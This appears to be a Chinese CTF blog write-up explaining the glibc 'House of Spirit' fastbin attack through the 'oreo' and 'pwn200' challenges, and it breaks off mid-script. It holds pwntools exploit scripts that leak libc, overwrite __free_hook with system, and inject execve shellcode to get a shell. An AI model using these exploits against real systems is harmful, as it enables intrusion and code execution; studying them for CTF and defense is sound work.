@@ -1,0 +1,538 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>House of spirit系列 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一、原理分析：House of spirit思想：
+
+这是fastbin的一种attack的方式，就是我们想要控制的区域是不可控的，但是我们能通过伪造fake_chunk来释放它再申请从而得到目标区,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">House of spirit系列</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/House%20of%20spirit/" title="House of spirit系列" class="">House of spirit系列</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    49k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    44 mins.
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/house%E5%AE%B6%E6%97%8F/" rel="tag">house家族</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h3 id="一、原理分析："><a href="#一、原理分析：" class="headerlink" title="一、原理分析："></a>一、原理分析：</h3><p>House of spirit思想：</p>
+<p><img src="/blog_img/1567335554720.png" alt="56733555472"></p>
+<p>这是fastbin的一种attack的方式，就是我们想要控制的区域是不可控的，但是我们能通过伪造fake_chunk来释放它再申请从而得到目标区域，但是有前提：</p>
+<p>（1）获取目标区域地址（堆、栈、bss….）</p>
+<p>（2）伪造堆块（找到那两个可控区域）</p>
+<p>（3）有能覆盖堆指针的漏洞存在（覆盖堆指针为我们的目标区域地址）</p>
+<p>（4）调用free函数将伪堆块释放到fastbin中</p>
+<p>（5）申请堆块，将刚刚的伪堆块申请出来</p>
+<p>（6）输入数据，即可修改目标区域的内容</p>
+<p>（可以是改写ret地址或者任意地址写（free_hook–&gt;system））</p>
+<h5 id="这里构造很重要一点：nextchunk的大小要-gt-2size-z-0x10-，fake-chunk的size要在fastbin的范围"><a href="#这里构造很重要一点：nextchunk的大小要-gt-2size-z-0x10-，fake-chunk的size要在fastbin的范围" class="headerlink" title="这里构造很重要一点：nextchunk的大小要&gt;=2size_z(0x10)，fake_chunk的size要在fastbin的范围"></a><em>这里构造很重要一点：nextchunk的大小要&gt;=2</em>size_z(0x10)，fake_chunk的size要在fastbin的范围</h5><a id="more"></a>
+
+<h3 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h3><p>下面通过2道题演示下这种利用方式：</p>
+<p>2、oreo</p>
+<p><img src="/blog_img/1567335985474.png" alt="56733598547"></p>
+<p>32位的程序，got表可改，没有pie，比较舒服</p>
+<p><img src="/blog_img/1567336065712.png" alt="56733606571"></p>
+<p>常规菜单题，先整理一波名字，然后gdb调试过程中写出结构体：</p>
+<p><img src="/blog_img/1567336115027.png" alt="56733611502"></p>
+<p>先看下malloc函数：</p>
+<p><img src="/blog_img/1567336604930.png" alt="56733660493"></p>
+<p>*(chunk+13)=v1就是将上一个堆块的description的地址存到自己这个堆块的末尾，我们叫它last_heap，然后就是输入name和description，这里有溢出，可以修改last_heap为任意值，表示能任意地址读~</p>
+<p>下面是puts函数：</p>
+<p><img src="/blog_img/1567336761121.png" alt="56733676112"></p>
+<p>打印自己和*(i+13)内容，直接写个puts的got地址</p>
+<p>gdb具体看下布局：</p>
+<p><img src="/blog_img/1567336454152.png" alt="56733645415"></p>
+<p>看到先写内容，然后再写名字，最后会在heap_addr+13*4处留下指向上一个堆块的description的指针，而puts打印时就是看这个去索引然后输出上一个块的description内容的（逆序输出），所以我们打名字时，直接覆盖这里为puts的got表地址，直接打印出真实地址来~</p>
+<p>有了真实地址，下面就是怎么getshell问题了，那么怎么写呢？有写的地址吗？</p>
+<p>继续看edit函数：</p>
+<p><img src="/blog_img/1567336870976.png" alt="56733687097"></p>
+<p>这是往bss中的0x804A2A8中的地址(0x804A2C0)中写入内容，有个写地址，那么猜想，如果这个地址改写成free_hook的话，那就完事了，但是怎么改这里呢？要想改这里，首选劫持！那么这里附近有没有可控区域来构造fake_chunk呢？</p>
+<p>看下：</p>
+<p><img src="/blog_img/1567337040505.png" alt="56733704050">)<img src="/blog_img/1567337040581.png" alt="56733704058"></p>
+<p>发现可控区域1是可以伪造size的，但是一个个地计数，又因为固定大小的chunk，所以fake_size也要一样，也就是0x41，这个好办，申请0x41次就好了。而可控区域2使我们可以直接输入的位置(0x804A2C0)，在这里可以伪造next_chunk的size，绕过第三层的检测。</p>
+<p>万事俱备，接着开始撸：</p>
+<p>这里需要注意一点就是，free完会放到fastbin中，所以我们需要把description处的堆地址置为0，这样free时就不会一股脑全部进去了，而是只进去我们想让它进去的fake_chunk。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./oreo'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./oreo'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6</span></span><br><span class="line"><span class="comment"># payload32 = fmtstr_payload(offset ，&#123;xxx_got:system_addr&#125;)</span></span><br><span class="line"><span class="comment"># f = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># f[0x8048260]=0x45372800</span></span><br><span class="line"><span class="comment"># f[0x8048260+4]=0x7f20</span></span><br><span class="line"><span class="comment"># f.payload(7)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' </span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment">#     i += 1</span></span><br><span class="line"><span class="comment">#     print i</span></span><br><span class="line"><span class="comment">#     if local:</span></span><br><span class="line"><span class="comment">#         p = process('./babypie')</span></span><br><span class="line"><span class="comment">#         libc = elf.libc</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         p = remote('',)</span></span><br><span class="line"><span class="comment">#         libc = ELF('./')</span></span><br><span class="line"><span class="comment">#     sl = lambda s : p.sendline(s)</span></span><br><span class="line"><span class="comment">#     sd = lambda s : p.send(s)</span></span><br><span class="line"><span class="comment">#     rc = lambda n : p.recv(n)</span></span><br><span class="line"><span class="comment">#     ru = lambda s : p.recvuntil(s)</span></span><br><span class="line"><span class="comment">#     ti = lambda : p.interactive()</span></span><br><span class="line"><span class="comment">#     system_addr = '\x3E\x0A'</span></span><br><span class="line"><span class="comment">#     py = ''</span></span><br><span class="line"><span class="comment">#     py += 'a'*0x28 +'\x01'</span></span><br><span class="line"><span class="comment">#     sd(py)</span></span><br><span class="line"><span class="comment">#     ru('\x01')</span></span><br><span class="line"><span class="comment">#     canary = '\x00' + p.recv()[:7]</span></span><br><span class="line"><span class="comment">#     print "canary---&gt;" + hex(u64(canary))</span></span><br><span class="line"><span class="comment">#     py = ''</span></span><br><span class="line"><span class="comment">#     py += 'a'*0x28 + canary + 'aaaaaaaa' + system_addr</span></span><br><span class="line"><span class="comment">#     sd(py)</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         p.recv(timeout = 1)</span></span><br><span class="line"><span class="comment">#     except EOFError:</span></span><br><span class="line"><span class="comment">#         p.close()</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     p.interactive()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(name,description)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    sl(name)</span><br><span class="line">    sl(description)</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(notice)</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    sl(notice)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bk(0x080487F0)</span></span><br><span class="line">malloc(<span class="string">'aaaa'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">malloc(py,<span class="string">'kkkkkkkk'</span>)</span><br><span class="line">puts()</span><br><span class="line">ru(<span class="string">"Description: "</span>)</span><br><span class="line">ru(<span class="string">"Description: "</span>)</span><br><span class="line">puts_addr = u32(rc(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr---&gt;"</span> + hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0x5fbc6</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x40</span><span class="number">-2</span>):</span><br><span class="line">	malloc(py,<span class="string">'king'</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">malloc(py,<span class="string">'king'</span>)</span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'\x00'</span>*<span class="number">0x20</span>  <span class="comment">#因为是从c0开始写入，前面有0x18的空字符了，所以该需要0x20才能达到0x38</span></span><br><span class="line">py += p32(<span class="number">0x40</span>) + p32(<span class="number">0x71</span>) <span class="comment">#fake_next_size</span></span><br><span class="line">edit(py)</span><br><span class="line">free()</span><br><span class="line">malloc(<span class="string">'jjjj'</span>,p32(free_hook))</span><br><span class="line">edit(p32(system))</span><br><span class="line">malloc(<span class="string">'/bin/sh\x00'</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>2、下面来看一道迁移到栈的题目：</p>
+<p><img src="/blog_img/1567339955627.png" alt="56733995562"></p>
+<p>画面内容引起舒适</p>
+<p><img src="/blog_img/1567339937597.png" alt="56733993759"></p>
+<p>分析下，第一步写name，可以泄露ebp地址（去除0截断），第二步是写id，会存到距离ebp有0x10的位置</p>
+<p><img src="/blog_img/1567340031886.png" alt="56734003188"></p>
+<p>这里是第二次输入，给money，是在栈上，然后strcpy到堆地址：</p>
+<p><img src="/blog_img/1567340125213.png" alt="56734012521"></p>
+<p>可以看到，0x40字节真好可以覆盖掉堆地址，那么思路相当清晰：</p>
+<p>1、id的区域就是可控区域2，而money的输入就是可控区域1，我们构造好fake_chunk就可以直接free掉了，然后再申请得到栈地址，接着栈溢出填写shellcode返回地址。</p>
+<p><img src="/blog_img/1567340413427.png" alt="56734041342"></p>
+<p><img src="/blog_img/1567340437845.png" alt="56734043784"></p>
+<p>再申请时就可以得到了~然后可以写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn200'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./pwn200'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6</span></span><br><span class="line"><span class="comment"># payload32 = fmtstr_payload(offset ，&#123;xxx_got:system_addr&#125;)</span></span><br><span class="line"><span class="comment"># f = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># f[0x8048260]=0x45372800</span></span><br><span class="line"><span class="comment"># f[0x8048260+4]=0x7f20</span></span><br><span class="line"><span class="comment"># f.payload(7)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' </span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line">shellcode64 = <span class="string">'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment">#     i += 1</span></span><br><span class="line"><span class="comment">#     print i</span></span><br><span class="line"><span class="comment">#     if local:</span></span><br><span class="line"><span class="comment">#         p = process('./babypie')</span></span><br><span class="line"><span class="comment">#         libc = elf.libc</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         p = remote('',)</span></span><br><span class="line"><span class="comment">#         libc = ELF('./')</span></span><br><span class="line"><span class="comment">#     sl = lambda s : p.sendline(s)</span></span><br><span class="line"><span class="comment">#     sd = lambda s : p.send(s)</span></span><br><span class="line"><span class="comment">#     rc = lambda n : p.recv(n)</span></span><br><span class="line"><span class="comment">#     ru = lambda s : p.recvuntil(s)</span></span><br><span class="line"><span class="comment">#     ti = lambda : p.interactive()</span></span><br><span class="line"><span class="comment">#     system_addr = '\x3E\x0A'</span></span><br><span class="line"><span class="comment">#     py = ''</span></span><br><span class="line"><span class="comment">#     py += 'a'*0x28 +'\x01'</span></span><br><span class="line"><span class="comment">#     sd(py)</span></span><br><span class="line"><span class="comment">#     ru('\x01')</span></span><br><span class="line"><span class="comment">#     canary = '\x00' + p.recv()[:7]</span></span><br><span class="line"><span class="comment">#     print "canary---&gt;" + hex(u64(canary))</span></span><br><span class="line"><span class="comment">#     py = ''</span></span><br><span class="line"><span class="comment">#     py += 'a'*0x28 + canary + 'aaaaaaaa' + system_addr</span></span><br><span class="line"><span class="comment">#     sd(py)</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         p.recv(timeout = 1)</span></span><br><span class="line"><span class="comment">#     except EOFError:</span></span><br><span class="line"><span class="comment">#         p.close()</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     p.interactive()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"your choice : "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"how long?"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"give me more money : "</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"your choice : "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"your choice : "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">bk(<span class="number">0x0000000000400A29</span>)</span><br><span class="line">ru(<span class="string">"who are u?"</span>)</span><br><span class="line">py = <span 